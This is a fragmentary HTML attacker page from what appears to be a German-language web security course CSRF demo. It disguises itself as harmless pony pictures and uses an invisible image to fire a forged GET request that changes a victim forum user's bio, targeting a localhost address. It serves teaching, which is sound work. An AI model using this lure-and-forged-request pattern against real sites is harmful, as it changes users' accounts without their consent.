<!doctype html>
<!--
  ANGREIFER-SEITE für die CSRF-Demo (Kurs-Netz).

  Kurs-Szenario: Schick diese Seite (oder den Link darin) einem/einer Mitspieler:in,

  -> Trage unten bei TARGET die Forum-Adresse des OPFERS ein (dessen Instanz),

<html lang="de">
<head><meta charset="utf-8"><title>Süße Ponybilder 🐴</title></head>
<body>
  <h1>Nur ein paar harmlose Ponybilder…</h1>

  <script>
    // Adresse des OPFER-Forums hier eintragen:
    const TARGET = "http://127.0.0.1:5000";
    // GET-basierter CSRF: unsichtbares Bild feuert die state-changing Route.
    document.getElementById("shot").src =
      TARGET + "/set-bio?bio=" + encodeURIComponent("CSRF war hier 🤠");

    // Variante B (POST ohne Token) – scheitert am CSRF-Token des Fix:
